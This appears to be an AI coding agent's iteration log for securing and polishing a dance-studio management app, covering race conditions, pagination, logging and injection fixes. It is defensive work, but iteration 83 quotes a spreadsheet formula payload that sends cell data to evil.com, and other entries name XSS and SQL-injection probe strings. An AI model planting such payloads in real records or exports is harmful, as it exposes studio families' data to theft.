### Iteration 13 — DONE (verified live)
- **Staff UX: all 3 Performance Company flows → modals** (new company / audition / performance). The audition & performance flows were 4–5 chained prompts *and* made staff type a number to pick a company from a text list — replaced with modal forms and a real company dropdown. Verified live (performance create POST 201, dropdown populated); node-checked clean. Built with a reusable Jinja `{% call modal(...) %}` macro to speed remaining conversions.

### Iteration 14 — DONE (verified live)
- **Staff UX: whole pending-payments page → modals** (apply-late-fees, new-payment-plan, reject-payment). The payment-plan flow was 5 chained prompts incl. a type-a-number student picker → now a modal with a student dropdown (shows each student's balance). Verified live end-to-end (plan create POST 201, dropdown populated with 24 students). This clears a fall-critical page of all `prompt()`s. node-checked clean.

### Iteration 15 — DONE (smoke 57/57)
- **Audited the email/SMS message-blast flow** (studio→families comms — see the Email/SMS section): sound — correct de-duplicated recipient resolution, graceful degradation when SMTP is unconfigured (saves + returns emails to copy). Hardened: non-numeric `recipient_filter` → 400 (was a potential 500). Added 5 regression checks (resolve/degrade/validate/parent-blocked).

### Iteration 16 — DONE
- **Wired the QA harnesses into CI** (`.github/workflows/tests.yml`): both harnesses (57 + 16 checks) run on every push/PR against the prod dependency set. Verified in a clean CI-mirror venv — 57/57 + 16/16. Makes the whole session's security/billing/flow verification a durable regression gate instead of a one-time pass. (Activates when the branch is pushed.)

### Iteration 17 — DONE (smoke 57/57)
- **Accessibility: labeled every icon-only button app-wide** (~23 buttons across 12 templates — delete/edit/close/remove/move/copy) with `aria-label` + `aria-hidden` on the decorative icons. Screen-reader users now get names for all icon controls, not just the base shell. Verified: 0 unlabeled icon-only buttons; all templates compile; JS-heavy pages node-check clean. (A batch script mislabeled 2 text buttons — caught via a "label on a text-bearing button" scan and fixed.)

### Iteration 18 — DONE
- **Wrote the go-live runbook** ([GO-LIVE.md](GO-LIVE.md)): the ordered, executable launch sequence — required secrets (SECRET_KEY, admin password) → merge/deploy → post-deploy smoke test → optional client-side config (SMTP, Square, Zelle, Twilio, registration, cron), grounded in the app's actual config mechanisms. Turns the whole audit into an actionable launch plan. (Considered SRI/CDN hardening (P3-4) but left it: the Tailwind Play CDN can't take a stable SRI hash, and a real Tailwind build is a large refactor that would risk the design system — not worth it for a low-likelihood CDN-compromise risk.)

### Iteration 19 — DONE (smoke 61/61)
- **Verified taking attendance end-to-end** (the most-used fall feature — see the Attendance section): UI renders, mark-present persists (201), toggle-off removes (200), parents blocked (403). Added a 4-check regression. This was the last core fall flow I'd loaded pages around but not actually exercised.

### Iteration 20 — DONE (smoke 66/66)
- **Verified waiver signing end-to-end** (enrollment flow — see the Waiver section): parent signs own child's waiver (200) + reads back signed; typed-signature required; decline rules enforced (mandatory→400, opt-out→200); other-family still blocked (403). Added a 5-check regression. With this + attendance, every parent-and-staff flow a fall session touches is now exercised, not just code-reviewed.

### Iteration 21 — DONE (verified live)
- **Staff UX: makeups admin page → modals.** The log-makeup flow was 5 chained prompts incl. a *type-an-ID* dancer picker and type-a-class-ID pickers; now a modal with dancer + class dropdowns. The schedule-makeup flow (2 prompts) is a modal too. Verified live (log-makeup POST 201, dropdown populated with 24 students); node-checked clean. Makeups is used *during* the fall session (scheduling parent makeup requests), so this one mattered.

### Iteration 22 — DONE (verified live)
- **Staff UX: donations admin → modal.** The record-donation flow (4 prompts) is now a modal (donor name/email, amount, method dropdown). Verified live (POST 201). Donations are recorded *during* the fall/foundation season, so this was the last fall-used prompt flow — **every flow the studio touches in fall is now prompt-free.**

### Iteration 23 — DONE (verified live)
- **Staff UX: skills + waivers-admin → modals.** Skills add (2 prompts) → modal; waivers-admin new/edit form (title/body/opt-out prompts + a confirm) → one modal with a proper opt-out checkbox and a body textarea. Verified live (skill add POST 201); both node-checked clean. **Only the two spring-only recital templates still use browser prompts** — the entire rest of the app is prompt-free.

### Iteration 24 — DONE (verified live)
- **Staff UX: recital screens → modals (the last prompts).** Recital hub 'New Year' (title+year) and 'Add Number', plus recital-manage 'New Costume' (name/fee/vendor + type-a-number class picker → class dropdown) are now modals. Verified live (recital create POST 201); node-checked clean. **grep for `prompt(` across all templates now returns 0 — the entire app is prompt-free.** Every data-entry flow, fall or spring, is a proper modal.

### Iteration 25 — DONE
- **Scoped the one remaining item — auto-pay** ([AUTOPAY-SCOPE.md](AUTOPAY-SCOPE.md)): decision-ready design so it can be greenlit/deferred. Grounded in the app's existing Square integration (customer helper + idempotent recurring scheduler already exist), it lays out the Cards-API/Web-Payments-SDK approach, `SavedCard` model, charge-on-schedule + failure handling, PCI (SAQ-A) posture, a ~3–4 day phased build, risks, and the recommendation to launch fall on manual and build auto-pay as the first post-launch project. This turns "what remains" into an actionable decision for the one open item.

### Iteration 107 — DONE (smoke 312/312, billing 22/22)
- **Extended the boot-hang finding to request handlers: the manual "remind everyone who owes" endpoint had the same timeout risk.** `POST /api/balances/send-reminders` looped over every owing student sending an email + SMS **synchronously in the request** — for a large studio × (email + up to a 15s SMS) that exceeds the 120s gunicorn worker timeout and 502s the request (worse than the boot case, since an admin triggers it regularly). Backgrounded it like the auto-reminder: compute the owing set synchronously, return `"Sending reminders to N family(ies)…"` immediately, and run the sends in a daemon thread. The frontend already just shows `data.message`, so no UI change. Guarded by `run_manual_reminders_non_blocking` (a 2s slow send must not block the POST). +1 check.
- **Noted (not changed — UX-sensitive): the message blast** (`POST /api/messages`) also sends synchronously, but it's **email-only** (no 15s SMS multiplier, so the threshold is ~150 recipients before the timeout bites) and its synchronous response carries genuinely useful feedback — the sent count and, on SMTP failure, a **copy-these-emails fallback** that backgrounding would lose. For a studio near that size the mitigation is class-targeted (smaller) blasts; backgrounding it is a quick follow-up if "email all parents" to 150+ becomes routine. Flagged rather than unilaterally changing a UX flow with a valuable fallback.

### Iteration 106 — DONE (smoke 311/311, billing 22/22)
- **Found that production drops all INFO logs — the diagnostic logging I'd been adding was half-blind in prod.** `logging.basicConfig(level=INFO)` lived inside `run.py`'s `if __name__ == '__main__'` block, but production runs `gunicorn run:app`, which **imports** the module (so `__main__` never executes) → `basicConfig` never ran in prod. ERROR logs still surfaced (Python's last-resort handler emits WARNING+ to stderr, so the `logger.exception` send-failure diagnostics from iters 101/102/105 worked), **but every INFO log was silent** — including the operational confirmations that the automated engines actually ran ("Auto-reminders processed: N", "Recurring charge #N: charged N students", boot). The operator had no log-level way to confirm the money/notification automation fired.
- **Fixed:** moved `basicConfig` to `run.py` module scope so it configures logging under **both** gunicorn (import) and the dev server (`__main__`). Verified by simulating gunicorn's `import run` — the root logger now has an INFO `StreamHandler` and an app-module INFO log reaches stderr (which Fly captures); previously it was dropped. Tests import `app` directly (not `run`), so test output is unaffected.
- **Locked in:** `run_logging_config_guard` — asserts `basicConfig` sits at `run.py` module level, so it can't regress back into `__main__` (which would re-blind production). +1 check.

### Iteration 105 — DONE (smoke 310/310, billing 22/22)
- **Audited the last un-deep-checked send-path (SMS/Twilio) and found a real boot-hang risk in the reminder pipeline.** `app/sms.py` itself is solid (never raises, logs failures, 15s timeout, body-capped). But tracing its callers surfaced the issue: `_process_auto_reminders()` runs **synchronously on every app boot** (inside `create_app`) and loops over students doing an email **plus** an SMS (each a network round-trip, SMS up to a 15s timeout) per student. Once the studio configures SMTP/SMS and grows past ~100 students-with-balances, the once-a-month reminder-day boot would run for minutes — **exceeding the 120s gunicorn worker timeout, 502-ing the Fly-wake request, and losing the un-sent reminders** (the month is marked done first). It's the only startup task doing network I/O in a loop (recurring-charges is DB-only).
- **Fixed:** the fast, no-network part (gating + the anti-spam "mark month done") stays synchronous on boot; the actual send loop now runs in a **background daemon thread** with its own app context, so a slow SMTP/Twilio can never block boot or the triggering request. On the single gthread worker this ties up at most one of four threads (network I/O releases the GIL), keeping the app responsive; at-most-once semantics are preserved (month marked done before the thread starts). Wrapped so a background failure just logs.
- **Locked in:** `run_reminder_non_blocking` — arms a deliberately-slow (2s) email sender and asserts `_process_auto_reminders` returns in <1s, proving the sending is off-thread (an inline regression would block ~2s and fail). +1 check. All three send-paths (email, SMS, Square) are now audited: robust, logged, and non-blocking.

### Iteration 104 — DONE (smoke 309/309, billing 22/22)
- **Closed the last documented list-cap gap: the sent-message history.** It was capped at `limit(50)` with no way to reach older blasts (noted as lower-stakes in iter 97 since it's a low-volume log — only manual blasts write `Message` rows, receipts/reminders don't — but "months of history" still isn't "all," and a studio keeping records should be able to see every message it sent). Converted the endpoint to `.paginate()` (returns `{page, pages, total}`) and added the same Prev/Next controls as the transactions list (hidden on a single page). **Every list surface in the app now either paginates with controls, loads its complete set, or is intentionally a recent-N view — no silent caps remain.**
- **Verified + guarded:** `run_messages_pagination` seeds 60 messages and asserts page 1 caps at 50 with `pages>=2` and page 2 carries the overflow. +2 checks. This removes the one "noted but not fixed" caveat from the assessment — the only remaining items are now Thomas's operator steps and product decisions, with no open code gaps.

### Iteration 103 — DONE (holistic browser regression; smoke 307/307, billing 22/22)
- **End-to-end regression pass after the session's 100+ commits** — a "does it all still hang together" check across the whole app on a freshly-restarted server (clean boot, only the expected RFID warning).
- **Staff shell + all 14 core pages** (dashboard, students, classes, transactions, attendance, families, aging, revenue, settings, messages, company, recital-hub, analytics, change-password) render **200 with no error/Jinja/undefined leak**.
- **Parent portal** (the original P0 — its JavaScript was entirely dead from a bad string escape) is fully alive: greeting + child card render and **all 8 lazy sections fetch successfully** (`payment-options`, `my-payments`, `my-company`, `waivers`, `donation-info`, `my-makeups`, `my-recital`, `my-costumes` — every one 200). No console errors on any page. Confirms the shell-level changes this session (the `fetchAllStudents`/`globalSearch` additions to `base.html`, pagination, etc.) did not regress any surface. Branch is cohesive and deployable.

### Iteration 102 — DONE (smoke 307/307, billing 22/22)
- **Swept every `except` block for swallowed failures in critical paths** (following the iter-101 Square gap). Mapped all handlers across routes/init/email/sms/square/helpers/auth/main. The overwhelming majority are **legitimate**: input-validation catches (`except (TypeError, ValueError)` → clean 400) need no logging; `email.py`'s `except Exception: pass` only wraps `smtp.quit()` in the `finally` (emails already sent); the update endpoints' `pass` keep the old value on bad input (commented); the nav-badge **context processor**'s broad catch → `counts: 0` is correct best-effort (it runs on every render, so logging there would spam, and a failing count-query means the page is broken anyway).
- **One real gap, fixed:** the **message-blast** SMTP failure surfaced the error to the admin (good — with a copy-these-emails fallback) but **never logged server-side**, so a recurring "blasts aren't sending" problem had no server trail. Added `logger.exception(...)` — now it's both user-surfaced and diagnosable, consistent with the iter-101 Square fix. Together these close the "critical send-path failures are invisible in logs" theme.

### Iteration 101 — DONE (smoke 307/307, billing 22/22)
- **Audited the Square invoice-*creation* path** (I'd hardened the webhook in iter 72 but not the send side — real money-collection code that activates when the studio enables Square for fall). The structure is sound: config-gated, validates balance > 0, invoices the **net** balance (good comment on Square summing line items), and the failure path rolls back so no orphan `SquareInvoice` is left. Confirmed the post-commit `result['invoice_url']` access can't KeyError — `send_invoice` always returns that key (`getattr(published,'public_url','')`).
- **Fixed the one real gap: the failure was invisible server-side.** The `except` did `return jsonify({'error': str(e)}), 500` — it **never logged**, so a "Square invoices aren't sending" report would have no server log to diagnose, and it echoed the raw exception to the client. Now it `logger.exception(...)`s the full failure and returns the studio's usual clean Square detail (via `square_service._error_detail`, matching `test_connection`). Verified `_error_detail` handles arbitrary exceptions without itself raising; suites green.

### Iteration 100 — DONE (smoke 307/307, billing 22/22; full re-verification)
- **Comprehensive re-verification + refreshed the headline verdict.** Re-ran everything (smoke 307/307, billing 22/22, `create_app()` boots clean) and brought the top-of-file verdict current: it had gone stale at "71 commits" and described only the original landing. Updated to **105 commits** and added a "Further hardening" paragraph so the headline actually reflects the classes closed in the deep-audit passes (full injection surface, four concurrency races, client double-submit, the silent list-cap/roster class, the rebuilt search, a11y, RFID recovery).
- **Saturation check:** the audit has reached comprehensive coverage. Security (IDOR, secret, CSRF, every injection sink, auth lifecycle, brute-force), robustness (all four HTTP verbs fuzzed, orphan rows, empty states), concurrency (all races + constraint proofs), money (every flow + precision + date edges), data integrity (unique constraints), list/pagination completeness, and UI wiring/a11y/destructive-confirm coverage are all audited and guarded. Remaining items are the **operator steps and product decisions in "What remains"** (SECRET_KEY, admin password, auto-pay, Jackrabbit import, optional client config) — none are code defects. Further iterations will target the lower-priority polish backlog (e.g. the messages-history 50-cap) and re-verification rather than net-new defect classes.

### Iteration 99 — DONE (smoke 307/307, billing 22/22)
- **Audited confirmation coverage on destructive actions.** Scanned every JS handler that issues a DELETE (or a reject/deactivate/void). **The irreversible, high-stakes deletes all already confirm** (delete student, class, transaction, recurring rule, etc.) — only 6 destructive handlers had no `confirm()`. Triaged them by whether the action loses state that re-adding can't restore:
  - **Added a confirm to 2** where it matters: `removeWait` (re-adding puts the student at the **back** of the waitlist — an accidental remove loses their place in line) and `removeMember` (removing a dancer's company membership).
  - **Left 4 as-is, deliberately:** the recital `×` chip removals (`removeCast`, `removeAssign`, `removeCostumeAssign`) are bulk-edit chip removals during show planning where a confirm-per-click is friction and re-adding is trivial; and `submitReject` is already a deliberate two-step modal flow (open reject modal → enter reason → submit), so a confirm would be redundant.
- Net: destructive-action safety is now consistent — anything that causes real or position-losing data loss confirms first; trivially-reversible chip edits stay friction-free. Suites green.

### Iteration 98 — DONE (smoke 307/307, billing 22/22; browser-verified)
- **Found the roster cap in two more student pickers and fixed the whole class with a shared helper.** After fixing the students list (iter 97), swept every `/api/students` fetch and found the same page-1-only cap in **the class-enrollment picker** (`classes/list.html` — students past the first 100 couldn't be enrolled into a class) and **the manual check-in modal** (`attendance/list.html` — they couldn't be checked in), both filtering a page-1 list client-side. The attendance one is on the app's core action.
- **Fixed once, reused everywhere:** added `window.fetchAllStudents()` to the base shell (pages the API to the complete roster, 50-page safety bound) and routed all three pickers (roster list, enrollment, check-in) through it. Verified the server-rendered student dropdowns (transactions, messages) are already complete (`.all()` at the route). **The 100-student cap is now eliminated across every student picker in the app.**
- **Browser-verified** after restart: `fetchAllStudents()` returns the full roster (24 = reported total), the students page renders all 24 rows (not capped/stuck), no console errors. Guarded by the existing `run_students_roster_complete` (the loop-fetch contract) + the dead-handler guard (catches the shared helper being renamed out from under a caller).

### Iteration 97 — DONE (smoke 307/307, billing 22/22)
- **Swept every list endpoint for the same silent-cap class and found a worse one: the Students roster.** `students/list.html` fetched `/api/students?per_page=100` (page 1 only) and filters that list **client-side** — so a studio with >100 active students (very plausible for a 22-year studio, ages 3–83) would silently **hide students 101+ from both the roster and the page's own search box** (only the iter-93 topbar search, which queries the server, would find them). More severe than the transactions cap because students are the core entity and this bites on the roster's primary use.
- **Fixed:** `loadStudents` now pages through the API to assemble the **complete roster** (the API caps `per_page` at 100, so it loops until `pagination.pages` is exhausted, with a 50-page/5000-student safety bound — far past any real studio), so both the list and its client-side search are complete.
- **Verified + guarded:** `run_students_roster_complete` mimics the loop-fetch with a tiny page size and asserts the accumulated count equals the reported total (returns all 18 seeded, not just page 1). +1 check. The three properly-paginated endpoints are now both covered (students, transactions); `/attendance` and `/rfid/logs` paginate too but are viewed filtered (per-day/diagnostic), not browsed whole.
- **Noted (lower stakes, not fixed):** the Messages "sent history" list caps at 50 with no paging (`Message…limit(50)`) — a log, not primary data (covers months at the studio's cadence); flagged for future polish rather than fixed now to keep this focused on the roster.

### Iteration 96 — DONE (smoke 306/306, billing 22/22; browser-verified)
- **Found + fixed a data-visibility bug that grows into the fall: the Payments transactions list silently capped at 100.** The API paginates correctly (`page`/`per_page`, returns `{page, pages, total}`), but the frontend fetched `?per_page=100` (page 1 only) and **rendered no pagination controls** — so once the studio crosses 100 transactions (fast: ~100 students × a few charges each, within weeks), **every older transaction becomes invisible on the payments page with no way to page back.** Not day-one visible, which is exactly why it'd slip through — it surfaces mid-season when staff go looking for an older payment and can't find it.
- **Fixed:** wired the list to the pagination metadata it was already receiving — Prev/Next controls + "Showing X–Y of N · Page p of q", page state tracked, filters reset to page 1. Controls hide themselves when there's only one page.
- **Verified both layers:** a backend-contract smoke test (120 transactions → page 1 returns 100 with `pages=2/total=120`, page 2 returns the remaining 20) so a future backend change can't silently break the frontend's paging; and **browser-verified** the control rendering (page 1 → Prev disabled/Next enabled/"Showing 1–100 of 250"; last page → Next disabled; single page → controls hidden; no console errors). +2 checks.

### Iteration 95 — DONE (smoke 304/304, billing 22/22; browser-confirmed)
- **Accessibility audit (UX-polish scope).** Swept templates for the concrete, findable a11y defects: **0 images missing `alt`**. Inputs: **found one real nameless-field defect** — the three password fields on `/auth/change-password` had visual `<label>`s but **no `for`/`id` association, no `aria-label`, no placeholder**, so a screen reader announces three anonymous "edit text" fields with no way to tell current/new/confirm apart. **Confirmed via the live accessibility tree** (each input's computed accessible name was empty).
- **Fixed:** paired each label with its input via `for`/`id`. Verified the other auth forms are already correct — `login`, `forgot_password`, and `reset_password` all use proper `for`/`id` association. (The public registration form's parent fields use placeholders — an accessible name exists, though placeholder-as-label is a minor polish item, not a nameless field.)
- **Locked in:** `run_auth_form_labels` — asserts every text/email/password field on the four standalone auth forms has an accessible name (`for`/`id` label, `aria-label`, placeholder, or wrapping label). +1 check. Guards the highest-stakes forms (every user hits login; account security hits change/reset password) against a future nameless field.

### Iteration 94 — DONE (smoke 303/303, billing 22/22)
- **Systematic dead-UI sweep** (prompted by the iter-93 dead search box — if one prominent affordance was inert, others might be). Checked the whole template tree for: `href="#"` links (2 — both the recital booklet buttons, **wired** via JS that sets their href to `/recital/<id>/booklet`), handler-less `<button>`s (all use the `data-* + .xxx-btn` event-delegation pattern — **every `-btn` class has a matching JS handler**), inline `on*` handlers calling undefined functions (**none**), `<form>`s with no action/submit (3 — the registration form is JS-wired; the two auth forms are valid `method=POST` self-posts), and hardcoded internal `href="/…"` links (**all four resolve to real routes**). **Conclusion: the topbar search box (iter 93) was the only dead UI element in the app; everything else is properly wired.**
- **Locked in a reusable static guard** `run_dead_handler_guard`: scans every template for inline `onclick/onchange/onsubmit/oninput` handlers and fails if any calls a function not defined in that template or the shared `base.html` shell — so a future button wired to a removed/misspelled function (looks functional, throws on click) is caught in CI. +1 check.

### Iteration 93 — DONE (smoke 302/302, billing 22/22; browser-verified)
- **Found + fixed a dead UI element: the staff topbar search box did nothing.** The header search input (placeholder "Search students, families, classes…") had **no `id`, no handler, no form, no endpoint** — purely decorative. Staff replacing Jackrabbit (which has real search) would type a student's name and get silence. A prominent affordance that looks like a core feature but is inert is a real UX defect, not just a missing nice-to-have.
- **Built it for real:** a staff-only `GET /api/search?q=` that matches active students (first/last/full name), families, and classes case-insensitively (parameterized `ilike`, 8 each), each result linking to its page; wired the input to an Alpine dropdown (debounced fetch, grouped results, click-to-navigate, click-outside/escape to close). Names render via Alpine `x-text` → **auto-escaped**, so a student named `<img onerror>` can't XSS the staff view; the query is parameterized so a `%';--` input can't inject.
- **Verified:** 5 smoke checks (finds student+family by name, result links to the right page, 2-char minimum, survives a wildcard/quote query, **parent gets 403** — a parent must not enumerate the roster). **Browser-verified** end-to-end after a server restart (which also re-confirmed the endpoint + base-shell changes boot clean): typing "John" as admin rendered a clickable "Aaliyah Johnson → /students/5/detail" in the dropdown, no console errors.

### Iteration 92 — DONE (smoke 297/297, billing 22/22)
- **Audited query efficiency + the recurring-charge date edge — both sound, plus strengthened a thin regression guard.** On the constrained 256MB single-worker box that auto-sleeps and wakes cold, an N+1 on a high-traffic page would bite: verified the studio-scale list pages (payments, ledgers, dashboard, reminders) all load balances via `calc_balance_bulk` — **one** `GROUP BY student_id, type` query, not per-student — and the only per-student `calc_balance` loop is the parent portal over a parent's own 1–4 kids (negligible N). No N+1 at scale.
- **Recurring-charge due-day is correct and boot-robust:** `due_day = min(day_of_month, last_day)` clamps a 29th/30th/31st charge to a short month's last day (so families set for the 31st still get billed in February), and the `today.day < due_day` (strict `<`, not `==`) means a charge fires on *any* boot on/after the due day — not only if Fly happens to be awake on the exact day — while the per-month `already` guard prevents a double-charge across the day's multiple wakes. All correct.
- **But the short-month clamp had no test** (the existing gate test only checks "doesn't fire early"). Made `_process_recurring_charges` take an injectable `today` (defaults to real date — clean dependency injection, no clock-mocking) and added `test_recurring_short_month_clamp`: a day-31 charge with an injected Feb-28 "today" must fire on the 28th. +1 billing check (22).

### Iteration 91 — DONE (smoke 297/297, billing 21/21)
- **Completed the iter-88 attendance-uniqueness change across all three attendance writers.** After adding the unique `(student, class, day)` index, I'd handled the `IntegrityError` in `toggle_attendance` and `manual_checkin` (already wraps its commit) but not the **third writer — the background RFID scan loop** (`rfid/service.py`). Its `commit()` sat under a broad `except Exception` that logged and returned but **never rolled back**, so a commit that hit the new index would leave the session in an aborted state and **wedge every subsequent scan** with `PendingRollbackError`. (Not fall-critical — classes run at community centers with no readers, and the loop already debounces rapid re-scans — but it's a failure mode my index introduced.)
- **Fixed:** the RFID insert now catches `IntegrityError`, rolls back, and treats it as an already-checked-in success (consistent with `toggle`/`manual_checkin`). All three attendance-creation paths now handle the constraint uniformly. Verified the module parses + imports; suites green. (Non-fall background path, so verified by inspection/import like the iter-90 UI guards, not a new smoke test.)
- **Surfaced a go-live consideration (not a defect): no bulk data-import path.** The studio is leaving Jackrabbit, so their existing roster has to get *in*. Two paths exist — **public self-registration is built** (flip `registration_open`, send families the link) and is the assumed path; a **bulk CSV importer is not built**. Added to "What remains" as a decision, not built unilaterally: the right column mapping depends on Jackrabbit's export format and whether the studio prefers self-registration over a one-shot import (and whether historical balances need to carry over). See "What remains" item 5.

### Iteration 90 — DONE (smoke 297/297, billing 21/21; browser-verified)
- **Closed the double-submit story on the client side.** The server-side concurrency fixes (iters 86–89) cover races on transitions with a natural idempotency key; the remaining exposure is the money-*create* actions that have **no** such key (two identical charges can be legitimate, so the server can't auto-dedup). The four money-mutation form handlers **did not disable their submit button in flight** and closed their modal only on success — so a double-click (or an impatient click on slow wifi) fires two POSTs before the first returns: `saveTransaction` → double charge/**double-credit a payment**, `saveBulkCharge` → charge a whole class twice, `saveRecurring` → **a duplicate auto-billing rule that double-charges every month** (the worst), and the parent `submitClaim` → duplicate pending payments.
- **Fixed:** each handler now disables its submit button (or sets an in-flight flag for the parent claim) on entry, bails if already submitting, and re-enables in a `finally`. No natural idempotency key needed — the client simply can't fire the second request.
- **Browser-verified** (restarted the dev server — which also confirmed the iter-88 attendance-index migration boots cleanly against the existing dev DB, no errors): logged in as admin, loaded the transactions page, spied on `fetch`, and confirmed a submit while the button is disabled makes **zero** fetch calls while an enabled submit makes exactly one; the parent-portal guard is served; no console errors.
- **Note:** these are UI guards (not a server invariant), so they're verified in the browser rather than added to the Python smoke suite. The server-side races that *could* corrupt data are the ones with automated regression guards (iters 86–89).

### Iteration 89 — DONE (smoke 297/297, billing 21/21)
- **Found + fixed a concurrent double-charge on bulk late fees** (real money). `apply_late_fees` has a per-student per-month idempotency check — so a *sequential* re-run correctly skips families already charged (and re-running to catch newly-over-threshold families is intended) — but it's check-then-act: two *concurrent* runs (a double-click on the owner's monthly "apply late fees" button) both read the pre-charge state and each post a late fee to every over-threshold family. **Reproduced:** 4/4 concurrent runs → **2 late fees per family.**
- **Fixed by serializing runs with a process lock** rather than changing the flexible re-run semantics: holding `_late_fee_lock` across the check+commit makes the second run see the first's committed charges and skip them. Valid because the deploy is a **single gunicorn worker** (documented invariant); commented that it would need a DB-level guard if workers were ever scaled. Verified: 5/5 concurrent runs → exactly one late fee, both 200.
- **Locked in:** `run_late_fee_race` — two simultaneous late-fee applications charge each family exactly once. +1 check.

### Iteration 88 — DONE (smoke 296/296, billing 21/21)
- **Found + fixed a duplicate-row race on the app's core action — taking attendance.** `toggle_attendance` is check-then-act, and unlike every other association table **`Attendance` had no `UniqueConstraint`** on (student, class, day). Two concurrent taps — very plausible, since teachers take attendance on community-center wifi where a laggy double-tap fires two POSTs — both pass the "already present?" check and create **duplicate 'present' rows**, inflating counts and breaking the toggle (the next tap deletes only one). **Reproduced:** 4 of 5 concurrent runs created 2 rows.
- **Fixed at the DB level (matching every other association table):** added a **functional unique index** `ix_attendance_unique_day` on `(student_id, class_id, date(check_in_time))` via the startup migration, which **de-dupes any existing duplicate rows first** (keep earliest) so it's safe on a clean *or* already-dirty prod DB, and is idempotent (`IF NOT EXISTS` + no-op DELETE). `toggle_attendance` now catches the `IntegrityError` from a losing concurrent tap and returns a clean "already present" 200 instead of a 500. Verified: concurrent taps → exactly 1 row, one 201 + one 200; the dedupe path collapses 3 seeded dupes → 1 and then rejects further same-day inserts; re-running migrations twice is clean.
- **Locked in:** `run_attendance_race` — two simultaneous toggles never create a duplicate row and never 500. +1 check. (The existing `run_migration_idempotency` guard also now exercises the new index step.)

### Iteration 87 — DONE (smoke 295/295, billing 21/21)
- **Completed the concurrency audit of every state-transition endpoint.** Applied the iter-86 lens to the rest and found **one more real duplicate-creating race:** `approve_registration` is check-then-act and creates a `Family` (+ students + enrollments) — and `Family` has **no natural unique key**, so two concurrent approvals (double-click) each create a full duplicate family. **Reproduced:** two approvals → **2 families, 2 students.** Fixed with the same atomic conditional-claim (`UPDATE … WHERE id=? AND status='pending'`, rowcount check, rollback the loser). Verified: one 200 + one 400, exactly one family.
- **Proved the rest are safe:** every "create-if-not-exists" transition (audition-accept → `CompanyMembership`, sign-up → `AuditionSignup`, enroll/waitlist → `ClassEnrollment`/`WaitlistEntry`, skills, costume assignments, cast, waivers, acks) writes to an **association table with a DB `UniqueConstraint`** — so a concurrent double-submit is caught at the database level (no duplicate row possible). Confirmed empirically on the audition-accept path (double-accept → exactly **1** membership). **Conclusion: the only two transitions that create rows without a natural unique key — `confirm_pending_payment` (Transaction) and `approve_registration` (Family) — are both now atomic; everything else is constraint-protected.** The concurrency class is closed.
- **Locked in:** `run_registration_approve_race` — two simultaneous approvals create exactly one family. +1 check.

### Iteration 86 — DONE (smoke 294/294, billing 21/21)
- **Found + fixed a real double-credit race on payment confirmation** (the first concurrency bug — a new class). `confirm_pending_payment` was **check-then-act**: it read the row, checked `status == 'pending'`, then created the payment transaction(s) and flipped the status. Two concurrent confirms — an **admin double-click** or two open tabs — both pass the check before either commits, and both create transactions: **a $100 payment credits the family $200.** SQLite's write serialization doesn't help, because the second request's check already passed before it blocks on the write lock. **Reproduced deterministically** with a 2-thread barrier probe: both returned 200, **2 transactions created**.
- **Fixed with an atomic claim:** the status flip is now a conditional `UPDATE … WHERE id=? AND status='pending'` that re-checks status **in the DB at write time** and checks the affected-row count — only the first confirm matches a row (200); the second matches 0 rows and **rolls back its just-inserted transactions** (returns 400 "Already processed"). Verified: across repeated concurrent runs, exactly **one** transaction, one 200 + one 400.
- **Locked in:** `run_confirm_payment_race` — fires two simultaneous confirms at one pending payment and asserts the family is credited exactly once. +1 check. **Next iteration:** apply the same audit to the other check-then-act state transitions (registration approve → duplicate families; audition-signup accept; waitlist promote) — same pattern, lower money-stakes.

### Iteration 85 — DONE (smoke 293/293, billing 21/21)
- **Audited upload size + mimetype handling across all three image uploads** (Zelle QR, recital cover, recital ad — all stored as base64 data URIs in SQLite and re-served, so both a size and an injection concern on the 256MB box). **Sizes are bounded:** a global `MAX_CONTENT_LENGTH = 16MB` (Flask 413s above it) plus a per-endpoint 2MB cap on every image path — no unbounded upload can bloat the DB or OOM the machine.
- **Found + fixed a latent injection inconsistency:** the shared recital-image helper `_image_data_uri_from_request` claimed in its docstring to "mirror the Zelle QR upload" but used the **old prefix check** (`startswith('image/')`) — the exact hole iter 81 closed on the QR — so a `Content-Type: image/png"><script>` flowed raw into the data URI. **Not currently exploitable** (the booklet renders it through Jinja autoescape, and the hub serves it via a bytes endpoint), but it reopens the moment that URI is rendered in an unescaped JS `innerHTML` context like the QR was. Hardened it to the **exact-whitelist** (`image/png|jpeg|gif|webp`) so both image paths are now structurally injection-proof, matching the docstring.
- **Locked in:** extended `run_qr_upload_safety` to also POST a hostile mimetype to the recital cover endpoint and assert the stored data-URI header is clean. +1 check.

### Iteration 84 — DONE (smoke 292/292, billing 21/21)
- **Audited email header injection** — the last injection sink. Receipts, reminders, and blasts send to addresses and with subjects that can carry user-controlled values (a student/parent name or email from **public registration**), so a CRLF in a header value could inject headers (Bcc exfiltration, spoofing). **The core was already safe:** Python's `email` library raises `HeaderParseError` on an embedded newline in `m["Subject"]=…`/`m["To"]=…`, so injection isn't possible via `as_string()`. **But it exposed a robustness edge:** a CRLF-bearing address (which slips past registration's format check, since `_clean_str` only trims the ends) would raise **mid-loop** inside `send_email`, aborting the whole blast on one bad address.
- **Fixed (defense-in-depth + robustness):** `send_email` now strips `\r\n\x00` from the subject, sender, reply-to, and each recipient before building the message — so a CRLF value degrades to inert inline text instead of raising, and header injection is neutralized regardless of the underlying library. Verified: a CRLF subject + CRLF address emits **no `Bcc` header** and the send succeeds (no `HeaderParseError`).
- **Locked in:** `run_email_header_injection` — monkeypatches SMTP, sends with a CRLF subject + recipient, and asserts no injected `Bcc` header and no mid-send raise. +1 check. **Every injection sink is now audited** (cashtag XSS, QR mimetype XSS, open redirect, CSV formula, email headers).

### Iteration 83 — DONE (smoke 291/291, billing 21/21)
- **Found + fixed CSV / formula injection** in the roster + transaction exports. `_csv_response` wrote cells raw, so a cell starting with `= + @ -` executes as a **formula when the studio opens the CSV in Excel/Sheets** — and some of that data (**student names**) comes from **public registration** (untrusted). A registration with a first name of `=HYPERLINK("http://evil.com/steal?d="&A1,"tuition")` (or `=cmd|…` on legacy Excel) would fire on export.
- **Fixed:** `_csv_safe` prefixes any formula-triggering cell with a single quote (Excel then treats it as text), but **only escapes a leading `-` when the cell isn't a plain number** — so legitimate negative balances (`-50.00`) still render as numbers. Applied to every data cell in both CSV exports. Verified: a `=HYPERLINK` name → `'=HYPERLINK…` (inert), `-50.00` balance → stays numeric.
- **Locked in:** extended `run_csv_exports` — a formula name is neutralized, a negative balance is preserved. +2 checks.

### Iteration 82 — DONE (smoke 289/289, billing 21/21)
